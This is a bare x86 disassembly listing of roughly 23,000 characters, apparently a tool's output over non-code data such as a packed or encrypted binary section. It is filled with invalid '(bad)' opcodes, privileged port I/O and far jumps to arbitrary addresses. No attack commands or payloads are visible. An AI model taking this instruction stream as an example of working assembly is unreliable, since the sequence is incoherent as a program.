  4074e5:	jl     0x4074ca
  4074e7:	xchg   BYTE PTR [ecx+ebx*4+0x3b],dl
  4074eb:	push   ebx
  4074ec:	retf   0xfef5
  4074ef:	sbb    DWORD PTR ds:0xfb486596,edx
  4074f5:	imul   ebx,esi,0xffffffe4
  4074f8:	adc    eax,0x34ab6b40
  4074fd:	cmp    eax,0xc68770b6
  407502:	nop
  407503:	xrelease mov BYTE PTR [eax+0x4dfca6e9],bl
  40750a:	jecxz  0x4074c4
  40750c:	fimul  WORD PTR [ebp+0x76]
  40750f:	sti    
  407510:	jecxz  0x407493
  407512:	add    al,0x2c
  407514:	cdq    
  407515:	aas    
  407516:	xor    al,0x21
  407518:	mov    ds:0x2ffdfc00,eax
  40751d:	lods   al,BYTE PTR ds:[esi]
  40751e:	out    0x68,al
  407520:	add    eax,DWORD PTR [edx]
  407522:	and    eax,0x50095a05
  407527:	dec    esp
  407528:	cmc    
  407529:	mov    ecx,0xc1c5cb80
  40752e:	inc    edi
  40752f:	mov    bl,0x4d
  407531:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407532:	nop    ebx
  407535:	fld    DWORD PTR [eax+0x1f12b164]
  40753b:	add    BYTE PTR [edi+ecx*8-0x27602d67],bl
  407542:	mov    al,0x80
  407544:	pop    ss
  407545:	das    
  407546:	das    
  407547:	dec    edx
  407548:	out    0x82,eax
  40754a:	(bad)  
  40754b:	(bad)  [ecx+0x74]
  40754e:	jge    0x4074f4
  407550:	mov    edi,DWORD PTR [edx+eiz*2-0x4a]
  407554:	ret    
  407555:	data16 sbb BYTE PTR ds:[ebp-0x6cdb2668],dh
  40755d:	aas    
  40755e:	jno    0x4074fc
  407560:	ror    esp,0x2b
  407563:	das    
  407564:	xlat   BYTE PTR ds:[ebx]
  407565:	or     eax,0xe55426bf
  40756a:	jo     0x407518
  40756c:	sbb    dl,bh
  40756e:	lea    esp,[ecx+0x509c5194]
  407574:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407575:	ds xchg ebp,eax
  407577:	div    edi
  407579:	cli    
  40757a:	push   ebp
  40757b:	cmp    DWORD PTR [esi-0x3e],0xffffff8c
  40757f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407580:	cmp    eax,0xd91a6371
  407585:	lahf   
  407586:	jne    0x407562
  407588:	aam    0x2e
  40758a:	push   0x39
  40758c:	cld    
  40758d:	or     al,0x3a
  40758f:	cmp    al,0x6
  407591:	outs   dx,DWORD PTR ds:[esi]
  407592:	out    dx,eax
  407593:	and    DWORD PTR [esi+edi*8-0x15],0xffffffef
  407598:	sub    DWORD PTR [ebp+0x5b],esi
  40759b:	aaa    
  40759c:	enter  0x3f44,0x4e
  4075a0:	outs   dx,DWORD PTR ds:[esi]
  4075a1:	mov    esp,0x810824aa
  4075a6:	in     al,0x93
  4075a8:	dec    edi
  4075a9:	ins    BYTE PTR es:[edi],dx
  4075aa:	mov    ch,0x7d
  4075ac:	and    al,0xae
  4075ae:	jnp    0x40758d
  4075b0:	ss out dx,al
  4075b2:	stos   BYTE PTR es:[edi],al
  4075b3:	loop   0x4075a5
  4075b5:	jnp    0x40754a
  4075b7:	out    dx,al
  4075b8:	dec    esi
  4075b9:	in     eax,0xd5
  4075bb:	cmp    cl,BYTE PTR [edx+0x54f889e3]
  4075c1:	outs   dx,DWORD PTR ds:[esi]
  4075c2:	dec    ebp
  4075c3:	xchg   ebp,eax
  4075c4:	xor    al,0xf8
  4075c6:	xchg   ebx,ebp
  4075c8:	sub    DWORD PTR [ebp-0x4cedb110],edx
  4075ce:	sbb    esp,ecx
  4075d0:	gs dec ebp
  4075d2:	cmp    DWORD PTR [ecx-0xc4d23b3],esi
  4075d8:	add    ebx,DWORD PTR [ecx]
  4075da:	mov    dh,0xe2
  4075dc:	push   eax
  4075dd:	jg     0x407613
  4075df:	mov    fs,WORD PTR [edx]
  4075e1:	popa   
  4075e2:	retf   
  4075e3:	pop    edi
  4075e4:	xor    ebp,DWORD PTR [ebx+eax*4+0x4dc0d1ab]
  4075eb:	out    0x7,al
  4075ed:	mov    ebx,DWORD PTR [ecx]
  4075ef:	mov    ebp,0x2618d668
  4075f4:	fcom   DWORD PTR [edx]
  4075f6:	push   eax
  4075f7:	sbb    al,0x8e
  4075f9:	cli    
  4075fa:	mov    edi,0xf686f447
  4075ff:	mov    ch,0x3b
  407601:	inc    ebx
  407602:	bt     ecx,ebx
  407605:	out    dx,eax
  407606:	int3   
  407607:	retf   0x883a
  40760a:	jae    0x40766c
  40760c:	mov    al,ds:0xaa1ed3e6
  407611:	addr16 jmp 0x407625
  407614:	sub    esp,DWORD PTR [si+0x5c15]
  407619:	or     BYTE PTR [eax],ch
  40761b:	inc    esi
  40761c:	cmp    BYTE PTR [esi+0x6b0e2204],ch
  407622:	push   ss
  407623:	or     eax,0xb5dc3ff0
  407628:	aad    0x6
  40762a:	in     al,dx
  40762b:	jmp    0x51117382
  407630:	scas   al,BYTE PTR es:[edi]
  407631:	xor    eax,0x95b6376b
  407636:	mov    ebp,0x229be65c
  40763b:	adc    dh,BYTE PTR [edx+0x2318b95f]
  407641:	stc    
  407642:	ins    DWORD PTR es:[edi],dx
  407643:	add    al,0x39
  407645:	xchg   ecx,eax
  407646:	cmp    BYTE PTR [eax-0x4a2550e2],0x2c
  40764d:	sbb    ch,BYTE PTR [ebx+0x2902fcf4]
  407653:	adc    edi,0x7f
  407656:	jno    0x4076c9
  407658:	xchg   esp,eax
  407659:	in     eax,0xea
  40765b:	mov    bl,0x9e
  40765d:	xchg   ebp,eax
  40765e:	stos   BYTE PTR es:[edi],al
  40765f:	(bad)  
  407660:	(bad)  
  407661:	lock mov edx,0x888f6702
  407667:	iret   
  407668:	jb     0x407630
  40766a:	jnp    0x407655
  40766c:	ss pop edi
  40766e:	cmp    eax,0xd152b622
  407673:	lahf   
  407674:	outs   dx,DWORD PTR ds:[esi]
  407675:	mov    dl,0x91
  407677:	popf   
  407678:	lock icebp 
  40767a:	test   BYTE PTR [edx+0x49707fae],ch
  407680:	mov    edx,0xf4004a0d
  407685:	jg     0x407634
  407687:	cmp    ah,0x46
  40768a:	cmp    edx,ebp
  40768c:	mov    ebp,0x593d1df4
  407691:	mov    eax,ds:0x9a2f7f8f
  407696:	arpl   WORD PTR ds:0x70fbd73f,bp
  40769c:	push   ebp
  40769d:	loop   0x407651
  40769f:	pop    ss
  4076a0:	loope  0x407630
  4076a2:	mov    ah,0x70
  4076a4:	and    esi,eax
  4076a6:	lea    ebp,[eax+0x5a8fdb7f]
  4076ac:	pop    esi
  4076ad:	jnp    0x4076e5
  4076af:	xchg   ebx,eax
  4076b0:	xchg   ebp,eax
  4076b1:	cwde   
  4076b2:	aad    0x38
  4076b4:	stc    
  4076b5:	pop    esp
  4076b6:	ror    DWORD PTR [ecx+0x44b97e43],1
  4076bc:	out    dx,eax
  4076bd:	imul   esp,esp,0xfffffff8
  4076c0:	shl    BYTE PTR [eax+0x54d613ee],1
  4076c6:	add    eax,0xb94820c4
  4076cb:	sbb    al,0x8b
  4076cd:	std    
  4076ce:	and    al,0x90
  4076d0:	sub    edx,DWORD PTR [edx+0x15c8d1ab]
  4076d6:	xor    edx,esi
  4076d8:	call   0x46218c6c
  4076dd:	mov    ss,WORD PTR [edx-0x5f]
  4076e0:	adc    edx,eax
  4076e2:	in     eax,dx
  4076e3:	and    BYTE PTR [ecx],cl
  4076e5:	retf   0x44d
  4076e8:	leave  
  4076e9:	scas   al,BYTE PTR es:[edi]
  4076ea:	(bad)  
  4076eb:	outs   dx,DWORD PTR ds:[esi]
  4076ec:	rol    DWORD PTR [eax-0x1f0f955c],0x78
  4076f3:	mov    BYTE PTR [ebx],dl
  4076f5:	jg     0x407718
  4076f7:	test   BYTE PTR [ebp-0xf9036c],ah
  4076fd:	or     DWORD PTR [ebx+0x48],ebx
  407700:	inc    ebx
  407701:	fimul  WORD PTR [ebx+0x4646d3b8]
  407707:	out    dx,eax
  407708:	js     0x40774e
  40770a:	mov    eax,ds:0xb57fd669
  40770f:	push   esi
  407710:	or     al,0x0
  407712:	mov    edi,0x3dd5149c
  407717:	jne    0x40777c
  407719:	mov    esi,0x24308b56
  40771e:	adc    eax,0x1afa0bc5
  407723:	add    ch,BYTE PTR [esi-0x5ab8f47f]
  407729:	dec    edi
  40772a:	xchg   ecx,eax
  40772b:	retf   0x53c2
  40772e:	add    eax,0x3dd55d99
  407733:	sbb    eax,0x1cf84071
  407738:	push   edi
  407739:	add    dl,dl
  40773b:	pop    eax
  40773c:	fisttp QWORD PTR [edi-0x91cb054]
  407742:	out    dx,eax
  407743:	clc    
  407744:	popa   
  407745:	jno    0x4076eb
  407747:	(bad)  
  407748:	sti    
  407749:	int    0x9f
  40774b:	hlt    
  40774c:	fidiv  DWORD PTR [ebp+0x1]
  40774f:	adc    ch,BYTE PTR [esi]
  407751:	rol    BYTE PTR [ecx],0x5f
  407754:	in     al,0x66
  407756:	push   ss
  407757:	lods   eax,DWORD PTR ds:[esi]
  407758:	mov    BYTE PTR [ebp+0x5],dl
  40775b:	test   eax,0xe7cdb9ae
  407760:	fld    TBYTE PTR [ecx]
  407762:	xchg   eax,edi
  407764:	cld    
  407765:	pushf  
  407766:	retf   0x9530
  407769:	fidivr DWORD PTR [eax+eax*2]
  40776c:	mov    edi,?
  40776e:	lods   al,BYTE PTR ds:[esi]
  40776f:	out    0xdf,eax
  407771:	cmp    DWORD PTR [eax-0x7d],0x1229f38d
  407778:	(bad)  
  407779:	adc    DWORD PTR [edx],esp
  40777b:	imul   ch
  40777d:	cs (bad) 
  40777f:	sti    
  407780:	mov    ch,0x2b
  407782:	mov    bh,0x6a
  407784:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407786:	xor    DWORD PTR [ecx-0x57],edx
  407789:	lods   eax,DWORD PTR ds:[esi]
  40778a:	jl     0x4077d1
  40778c:	addr16 mov esi,0xd23a639
  407792:	mov    dl,0xf1
  407794:	mov    cl,0xf4
  407796:	xchg   ebx,eax
  407797:	sub    DWORD PTR [ebp+0x7f9ae00e],0x55
  40779e:	pop    ecx
  40779f:	into   
  4077a0:	retf   
  4077a1:	xor    eax,0x71de502d
  4077a6:	pop    eax
  4077a7:	retf   0xcf21
  4077aa:	jne    0x407741
  4077ac:	icebp  
  4077ad:	aam    0x37
  4077af:	mov    esp,0x5820d563
  4077b4:	mov    edi,DWORD PTR [eax+0x4e]
  4077b7:	imul   eax,DWORD PTR [edi-0x43613fc3],0x5c
  4077be:	xchg   edx,eax
  4077bf:	or     ebx,DWORD PTR [edi+0x3831cf97]
  4077c5:	pop    esi
  4077c6:	loop   0x407770
  4077c8:	mov    cs,WORD PTR [ecx]
  4077ca:	ds jmp 0x407807
  4077cd:	xchg   edi,eax
  4077ce:	int    0xa0
  4077d0:	xchg   esp,eax
  4077d1:	push   ss
  4077d2:	mov    dh,0xeb
  4077d4:	mov    eax,ds:0xb452782f
  4077d9:	pop    esp
  4077da:	xchg   esp,eax
  4077db:	cmp    eax,0xa3231ec2
  4077e0:	sbb    BYTE PTR [eax],dl
  4077e2:	mov    ds:0xf39398a3,al
  4077e7:	aas    
  4077e8:	inc    ecx
  4077e9:	aad    0x30
  4077eb:	sbb    BYTE PTR [edi],ch
  4077ed:	or     al,0x45
  4077ef:	loopne 0x407837
  4077f1:	xchg   ecx,eax
  4077f2:	jb     0x4077bf
  4077f4:	sub    al,BYTE PTR [esi]
  4077f6:	mov    ecx,0xd7510648
  4077fb:	mov    edi,DWORD PTR [ebx+0x4e]
  4077fe:	mov    ebp,fs
  407800:	pop    edx
  407801:	push   0xf5cb45e9
  407806:	inc    esp
  407807:	cdq    
  407808:	dec    esp
  407809:	test   eax,0x479efcbb
  40780e:	mov    eax,0x7ab78a2c
  407813:	pop    eax
  407814:	and    DWORD PTR [eax+0x70191a22],ebp
  40781a:	(bad)  
  40781b:	jnp    0x4077a6
  40781d:	pop    esp
  40781e:	stc    
  40781f:	clc    
  407820:	dec    ebp
  407821:	loop   0x407882
  407823:	push   ecx
  407824:	inc    ecx
  407825:	pop    eax
  407826:	leave  
  407827:	ja     0x407843
  407829:	jle    0x4077be
  40782b:	test   edx,edx
  40782d:	pop    eax
  40782e:	jbe    0x4077d6
  407830:	xchg   edx,eax
  407831:	xchg   DWORD PTR [esi+ecx*1+0x7414a691],esi
  407838:	ficomp WORD PTR [eax+0x37ea4ec9]
  40783e:	in     al,dx
  40783f:	xchg   edi,eax
  407840:	das    
  407841:	xchg   esi,eax
  407842:	jb     0x4078a1
  407844:	loopne 0x4078c0
  407846:	rcr    BYTE PTR [ebp-0x596d95ba],cl
  40784c:	das    
  40784d:	sti    
  40784e:	int    0x29
  407850:	sbb    cl,BYTE PTR [esp+edi*8-0x3f4e1c0]
  407857:	fs inc edx
  407859:	xchg   edi,eax
  40785a:	outs   dx,BYTE PTR ds:[esi]
  40785b:	xor    ebp,eax
  40785d:	mov    ecx,0xfb83d7f7
  407862:	(bad)  
  407863:	jns    0x4077ec
  407865:	inc    ebx
  407866:	dec    edx
  407867:	jge    0x407868
  407869:	(bad)  
  40786a:	jo     0x407850
  40786c:	lahf   
  40786d:	inc    esp
  40786e:	push   0xd7b1fad
  407873:	cmp    al,0x62
  407875:	push   0xfffffff1
  407877:	jae    0x407855
  407879:	imul   ebp,DWORD PTR [ebp+0x65],0x21
  40787d:	and    ebx,DWORD PTR [eax+0xea041e4]
  407883:	jns    0x4078e0
  407885:	out    dx,eax
  407886:	push   ss
  407887:	lea    esp,[esi-0x5a]
  40788a:	adc    DWORD PTR [ebx+0x7beddbca],ebx
  407890:	mov    dh,0x2e
  407892:	outs   dx,DWORD PTR ds:[esi]
  407893:	int    0xd9
  407895:	xor    dl,BYTE PTR [eax-0x7fc8ca8f]
  40789b:	xchg   esp,eax
  40789c:	cwde   
  40789d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40789e:	hlt    
  40789f:	enter  0x2f47,0x1d
  4078a3:	mov    eax,ds:0x4846cb2a
  4078a8:	jmp    0xa9b:0x27da365b
  4078af:	cmp    BYTE PTR [esi],cl
  4078b1:	sub    BYTE PTR [edx],bh
  4078b3:	addr16 js 0x40791f
  4078b6:	jl     0x4078cb
  4078b8:	pop    esp
  4078b9:	dec    eax
  4078ba:	rcpps  xmm1,XMMWORD PTR ds:0xcd41f295
  4078c1:	cmp    eax,0x3f14bddf
  4078c6:	pop    ds
  4078c7:	(bad)  
  4078c8:	addr16 aas 
  4078ca:	xchg   ecx,eax
  4078cb:	idiv   DWORD PTR [ecx]
  4078cd:	ret    0xf318
  4078d0:	mov    edx,0xfdc2f14b
  4078d5:	xchg   ecx,eax
  4078d6:	fiadd  DWORD PTR [ecx]
  4078d8:	add    dh,cl
  4078da:	ror    BYTE PTR [ecx-0x7b],cl
  4078dd:	out    0x6,al
  4078df:	mov    edx,0xb28874a3
  4078e4:	push   edi
  4078e5:	adc    cl,BYTE PTR [esi]
  4078e7:	ficom  DWORD PTR fs:[edx-0x3eb72053]
  4078ee:	cmp    al,0x88
  4078f0:	iret   
  4078f1:	mov    fs,WORD PTR [esi]
  4078f3:	push   ecx
  4078f4:	sbb    BYTE PTR [ebx],ah
  4078f6:	mov    bl,0xf9
  4078f8:	or     al,0x1f
  4078fa:	pushf  
  4078fb:	dec    esi
  4078fc:	and    al,0xe6
  4078fe:	xchg   BYTE PTR [ebp-0x22],bh
  407901:	daa    
  407902:	pop    esi
  407903:	dec    BYTE PTR [ecx-0x1e56316c]
  407909:	adc    ebp,DWORD PTR [ebx+0x39]
  40790c:	sub    bh,BYTE PTR [esi]
  40790e:	jb     0x407926
  407910:	imul   ebx,eax,0x50d116d6
  407916:	mov    al,0x8b
  407918:	dec    esi
  407919:	adc    DWORD PTR [esi],edi
  40791b:	or     ecx,ebp
  40791d:	fidivr WORD PTR [ebx+0x22]
  407920:	xor    DWORD PTR [ebp+0x58],ebx
  407923:	int3   
  407924:	sbb    eax,0x8b7a551c
  407929:	jp     0x407990
  40792b:	leave  
  40792c:	adc    esp,DWORD PTR [ebp-0x5e]
  40792f:	fnstsw WORD PTR [edi]
  407931:	das    
  407932:	jbe    0x4078bb
  407934:	sub    DWORD PTR [eax],eax
  407936:	inc    ecx
  407937:	pushf  
  407938:	mov    dh,0x9b
  40793a:	jbe    0x40792f
  40793c:	lea    ebx,[edx+0x4aa71dc8]
  407942:	jmp    0xb4709975
  407947:	ret    0x7087
  40794a:	mov    dh,0xa4
  40794c:	outs   dx,BYTE PTR ds:[esi]
  40794d:	test   ebp,0x5ed2cc57
  407953:	sbb    ch,BYTE PTR [ecx+0x13]
  407956:	add    dh,0x20
  407959:	ds pop edx
  40795b:	ins    BYTE PTR es:[edi],dx
  40795c:	mov    bh,0x93
  40795e:	inc    ecx
  40795f:	clc    
  407960:	sbb    BYTE PTR [ecx+ecx*4+0x54],bl
  407964:	jmp    DWORD PTR [esi+0x6e0ca25a]
  40796a:	(bad)  
  40796b:	not    DWORD PTR gs:[ebx+ebx*2]
  40796f:	inc    ebp
  407970:	mov    esi,0x68aab84
  407975:	js     0x407950
  407977:	arpl   WORD PTR [esi],bx
  407979:	xchg   ebx,eax
  40797a:	lea    ecx,[eax-0x2]
  40797d:	and    BYTE PTR [edi-0x75],dh
  407980:	cdq    
  407981:	ins    BYTE PTR es:[edi],dx
  407982:	push   0xe31443cf
  407987:	and    eax,0x48f01518
  40798c:	jp     0x407976
  40798e:	adc    ch,BYTE PTR [eax-0x78bf1cfd]
  407994:	lahf   
  407995:	inc    esp
  407996:	push   esi
  407997:	fwait
  407998:	mov    ebx,0x7eec0c62
  40799d:	mov    esp,0xd7fab119
  4079a2:	push   ecx
  4079a3:	sbb    ch,BYTE PTR [ecx]
  4079a5:	push   cs
  4079a6:	inc    edx
  4079a7:	push   edi
  4079a8:	lds    ecx,FWORD PTR [eax+ebx*1-0x79]
  4079ac:	xlat   BYTE PTR ds:[ebx]
  4079ad:	sbb    ecx,DWORD PTR [ebx+0x6f44ee76]
  4079b3:	aas    
  4079b4:	add    eax,0x72f92877
  4079b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079ba:	imul   ebp,DWORD PTR [ecx],0xffffffcf
  4079bd:	mov    bl,0x6b
  4079bf:	fdivr  st,st(3)
  4079c1:	fimul  WORD PTR [ebp-0x2f69b975]
  4079c7:	inc    ecx
  4079c8:	add    DWORD PTR [edi],0x50
  4079cb:	jbe    0x4079df
  4079cd:	inc    edx
  4079ce:	popf   
  4079cf:	mov    edi,0x66102abc
  4079d4:	(bad)  
  4079d6:	ins    BYTE PTR es:[edi],dx
  4079d7:	mov    edi,0x27a674fe
  4079dc:	xor    esi,DWORD PTR [ebp+0x398b4c5b]
  4079e2:	dec    ebx
  4079e3:	inc    esi
  4079e4:	or     ah,BYTE PTR [edi+0x71]
  4079e7:	repnz daa 
  4079e9:	ins    BYTE PTR es:[edi],dx
  4079ea:	loopne 0x407a0e
  4079ec:	ret    0x766d
  4079ef:	mov    esp,0x5fd4bf8a
  4079f4:	cmp    bh,BYTE PTR [edx-0x344a82fb]
  4079fa:	test   eax,0xb3a3a99f
  4079ff:	pusha  
  407a00:	imul   ecx,DWORD PTR [ebp-0x5e],0xffffff92
  407a04:	(bad)
  407a07:	int    0x6f
  407a09:	ins    DWORD PTR es:[edi],dx
  407a0a:	lods   al,BYTE PTR ds:[esi]
  407a0b:	or     eax,0x141fb8cd
  407a10:	xor    al,0x8d
  407a12:	pop    ebx
  407a13:	jbe    0x407a64
  407a15:	and    al,0x29
  407a17:	cdq    
  407a18:	ja     0x4079b3
  407a1a:	dec    edi
  407a1b:	test   eax,0x83156f3f
  407a20:	sbb    cl,BYTE PTR fs:[esi]
  407a23:	neg    DWORD PTR [ecx+0x869f5b5]
  407a29:	call   0x9443:0xeae2665a
  407a30:	ror    DWORD PTR [ecx+0x65e3e49e],cl
  407a36:	add    al,0x4b
  407a38:	lods   eax,DWORD PTR ds:[esi]
  407a39:	mov    eax,0xcc523b04
  407a3e:	add    al,0xd3
  407a40:	adc    DWORD PTR ds:0x85fea3c4,edx
  407a46:	dec    ecx
  407a47:	gs loop 0x407aac
  407a4a:	pop    ss
  407a4b:	jns    0x4079e7
  407a4d:	pop    ebp
  407a4e:	mov    ecx,0x12d37282
  407a53:	mov    esi,0xbdf62882
  407a58:	in     eax,0x38
  407a5a:	in     al,dx
  407a5b:	gs clc 
  407a5d:	mov    ds:0x20ac9925,eax
  407a62:	test   eax,0xfdecdb3e
  407a67:	mov    al,ds:0xc69800ee
  407a6c:	(bad)
  407a6f:	cmc    
  407a70:	and    edi,edx
  407a72:	add    eax,0xa86c6f50
  407a77:	out    0x78,al
  407a79:	sub    DWORD PTR [ecx+0xe80901c],esi
  407a7f:	jge    0x407a2f
  407a81:	fcmovnb st,st(4)
  407a83:	xlat   BYTE PTR ds:[ebx]
  407a84:	(bad)  
  407a85:	fnstenv [esp+ebp*4-0x2c5845b4]
  407a8c:	xchg   BYTE PTR [esi+esi*2-0x64],dh
  407a90:	add    eax,0x724c4866
  407a95:	push   ebx
  407a96:	cmc    
  407a97:	les    ebp,FWORD PTR [eax]
  407a99:	inc    edx
  407a9a:	out    0x7b,eax
  407a9c:	das    
  407a9d:	aam    0x1a
  407a9f:	pop    ecx
  407aa0:	adc    eax,0x21669c44
  407aa5:	inc    ebx
  407aa6:	repnz pop edi
  407aa8:	test   BYTE PTR [eax+0x4a],dh
  407aab:	adc    al,0xdd
  407aad:	inc    esi
  407aae:	retf   0x6aca
  407ab1:	int3   
  407ab2:	leave  
  407ab3:	ret    0x6972
  407ab6:	pushf  
  407ab7:	sti    
  407ab8:	sahf   
  407ab9:	or     DWORD PTR [ebp-0x3f2445],0x8cd364d7
  407ac3:	fld    QWORD PTR [ebp-0x2b]
  407ac6:	fisub  WORD PTR ds:0x7cfc8ed3
  407acc:	or     bl,BYTE PTR [edi]
  407ace:	fsubr  DWORD PTR [ecx+0x4c]
  407ad1:	dec    edx
  407ad2:	jg     0x407a82
  407ad4:	imul   ebp,DWORD PTR ds:0xe1afa80d,0x1
  407adb:	cmp    eax,0x673cc7f1
  407ae0:	call   0x625a:0x8eda84d
  407ae7:	mov    edi,0x51f82230
  407aec:	add    DWORD PTR [edi],ecx
  407aee:	mov    edi,0xd052b48c
  407af3:	jp     0x407ac6
  407af5:	inc    edi
  407af6:	push   eax
  407af7:	loopne 0x407af1
  407af9:	xchg   DWORD PTR [eax+0x12],esi
  407afc:	stc    
  407afd:	(bad)  
  407afe:	fbld   TBYTE PTR [edi+edi*2+0x7aabf26e]
  407b05:	mov    esi,0x5d8b9445
  407b0a:	push   edi
  407b0b:	xchg   edi,eax
  407b0c:	sub    BYTE PTR [ecx],0x1b
  407b0f:	out    dx,al
  407b10:	stc    
  407b11:	rcr    BYTE PTR [edx-0x1b],1
  407b14:	inc    ebx
  407b15:	repnz (bad) 
  407b17:	cmp    ch,BYTE PTR [edi]
  407b19:	mov    ds:0x9e8cdf4f,al
  407b1e:	inc    esi
  407b1f:	hlt    
  407b20:	xchg   esi,eax
  407b21:	fldcw  WORD PTR [ebx-0x11]
  407b24:	ret    0xfbce
  407b27:	xor    eax,0x3c33db75
  407b2c:	mov    edx,0x4e1a6c6c
  407b31:	pop    ebx
  407b32:	jae    0x407b43
  407b34:	xor    eax,0xf99d9052
  407b39:	xacquire xchg DWORD PTR [ecx+0x7b4af1da],ecx
  407b40:	and    eax,0x37821635
  407b45:	jge    0x407aca
  407b47:	xchg   edx,eax
  407b48:	fld    TBYTE PTR [ebx+0x6f]
  407b4b:	jne    0x407b99
  407b4d:	xor    bl,dh
  407b4f:	mov    cl,0x96
  407b51:	rol    DWORD PTR [esi],0x19
  407b54:	pushf  
  407b55:	fst    QWORD PTR [ebp-0x2d]
  407b58:	mov    edx,0x8b3f01ff
  407b5d:	jo     0x407b1d
  407b5f:	dec    esp
  407b60:	out    dx,al
  407b61:	loop   0x407b88
  407b63:	add    ebp,esi
  407b65:	add    DWORD PTR [ecx-0x2fd68afe],ebp
  407b6b:	imul   esp,DWORD PTR [eax],0xffffffb2
  407b6e:	out    dx,eax
  407b6f:	sbb    edx,0xa1cbd18a
  407b75:	mov    bl,0xd4
  407b77:	inc    ebx
  407b78:	cmp    BYTE PTR [ecx+0x68a0b0a6],ah
  407b7e:	cmp    BYTE PTR [ebx-0x28],0x1b
  407b82:	cld    
  407b83:	std    
  407b84:	fcmovu st,st(5)
  407b86:	jmp    0xff60:0x334e2354
  407b8d:	xchg   BYTE PTR [ebx],bl
  407b8f:	mov    gs,ebx
  407b91:	mov    edi,fs
  407b93:	sti    
  407b94:	shl    BYTE PTR [ecx+0x6b],0x5e
  407b98:	push   cs
  407b99:	xchg   edi,eax
  407b9a:	or     DWORD PTR [edx],edi
  407b9c:	jle    0x407bb7
  407b9e:	adc    ch,BYTE PTR [ecx]
  407ba0:	inc    esi
  407ba1:	lods   al,BYTE PTR ds:[esi]
  407ba2:	cmp    al,0x68
  407ba4:	pop    es
  407ba5:	dec    esi
  407ba6:	sub    eax,DWORD PTR [ebx+ebx*8+0x70]
  407baa:	inc    ecx
  407bab:	(bad)  
  407bac:	push   0x76deee60
  407bb1:	jp     0x407c0e
  407bb3:	mov    edx,0x1832eca9
  407bb8:	push   ds
  407bb9:	xor    al,al
  407bbb:	in     eax,dx
  407bbc:	sbb    ah,BYTE PTR [esi-0x68]
  407bbf:	fnstsw WORD PTR [eax-0x269bbc52]
  407bc5:	mov    BYTE PTR [eax-0x176a6286],dh
  407bcb:	push   esi
  407bcc:	stos   DWORD PTR es:[edi],eax
  407bcd:	sub    al,0xa1
  407bcf:	inc    esp
  407bd0:	adc    DWORD PTR [ecx+0xa],edi
  407bd3:	int    0xd
  407bd5:	adc    esi,edi
  407bd7:	mov    eax,ds:0x60ce2e11
  407bdc:	push   cs
  407bdd:	lock mov ebx,0x5eb4e7ee
  407be3:	jmp    0x407c62
  407be5:	ja     0x407bfe
  407be7:	fistp  WORD PTR [ebx-0x4251b8f]
  407bed:	test   BYTE PTR [edx-0x36],0x29
  407bf1:	out    dx,al
  407bf2:	adc    eax,0xd4fcc551
  407bf7:	cmc    
  407bf8:	das    
  407bf9:	push   DWORD PTR [esi]
  407bfb:	jge    0x407c62
  407bfd:	xchg   edi,eax
  407bfe:	push   eax
  407bff:	add    BYTE PTR [ecx+0x4786e7d1],al
  407c05:	mov    al,ch
  407c07:	mov    ecx,0x2730ebc3
  407c0c:	inc    esi
  407c0d:	es nop
  407c0f:	pushf  
  407c10:	pop    ecx
  407c11:	es push es
  407c13:	stos   DWORD PTR es:[edi],eax
  407c14:	mov    ch,al
  407c16:	dec    ebx
  407c17:	ds dec ebx
  407c19:	sub    al,0x5c
  407c1b:	push   ecx
  407c1c:	retf   
  407c1d:	mov    esi,0x8c25c7d2
  407c22:	mov    DWORD PTR [ebp-0x4dcdce83],ebp
  407c28:	retf   0x7257
  407c2b:	push   edi
  407c2c:	pop    eax
  407c2d:	xchg   BYTE PTR [edx],al
  407c2f:	inc    esp
  407c30:	adc    esi,ecx
  407c32:	leave  
  407c33:	fwait
  407c34:	leave  
  407c35:	sbb    dl,BYTE PTR ds:0x4de3fe17
  407c3b:	in     eax,0x22
  407c3d:	cs test al,0x5a
  407c40:	push   ss
  407c41:	(bad)  
  407c42:	popf   
  407c43:	xchg   ebx,eax
  407c44:	popa   
  407c45:	loopne 0x407c4f
  407c47:	sbb    eax,0x1c19a450
  407c4c:	mov    ah,ah
  407c4e:	cmp    dh,BYTE PTR ds:0x404c3205
  407c54:	in     al,dx
  407c55:	sub    BYTE PTR [esi+0x4f],dl
  407c58:	cdq    
  407c59:	cmp    al,0xb6
  407c5b:	int    0x72
  407c5d:	ins    BYTE PTR es:[edi],dx
  407c5e:	jmp    DWORD PTR [eax-0x3062687e]
  407c64:	fild   QWORD PTR [edx-0x5a]
  407c67:	cs or  al,0xc
  407c6a:	scas   eax,DWORD PTR es:[edi]
  407c6b:	xor    edi,DWORD PTR [edx+0x77128c4b]
  407c71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c72:	stos   DWORD PTR es:[edi],eax
  407c73:	daa    
  407c74:	es test al,0xbb
  407c77:	inc    esi
  407c78:	push   ss
  407c79:	retf   
  407c7a:	shl    BYTE PTR [eax],0x8d
  407c7d:	mov    edx,0x829d54b5
  407c82:	mov    edx,0xb187dd04
  407c87:	jmp    0x4daa1326
  407c8c:	jp     0x407c58
  407c8e:	jns    0x407cf8
  407c90:	js     0x407c22
  407c92:	fmulp  st(5),st
  407c94:	aam    0xee
  407c96:	js     0x407cd6
  407c98:	sub    BYTE PTR [ebx-0x6707334d],bl
  407c9e:	or     DWORD PTR [edi+0x62b1d90f],ecx
  407ca4:	jne    0x407c7a
  407ca6:	xchg   ebx,eax
  407ca7:	std    
  407ca8:	dec    ecx
  407ca9:	inc    edx
  407caa:	sub    al,BYTE PTR [esi+0xbdbe289]
  407cb0:	mov    ebp,0x5b90d59d
  407cb5:	stos   BYTE PTR es:[edi],al
  407cb6:	je     0x407ccb
  407cb8:	push   ebx
  407cb9:	lahf   
  407cba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407cbb:	mov    ah,BYTE PTR [edx+0x10f0f4e9]
  407cc1:	xchg   ecx,eax
  407cc2:	mov    dh,0xb9
  407cc4:	(bad)  [ebp+0x567af8dc]
  407cca:	arpl   cx,cx
  407ccc:	or     ch,dh
  407cce:	and    ebp,ebp
  407cd0:	dec    edi
  407cd1:	outs   dx,BYTE PTR ds:[esi]
  407cd2:	icebp  
  407cd3:	int3   
  407cd4:	sbb    eax,0x9d54127b
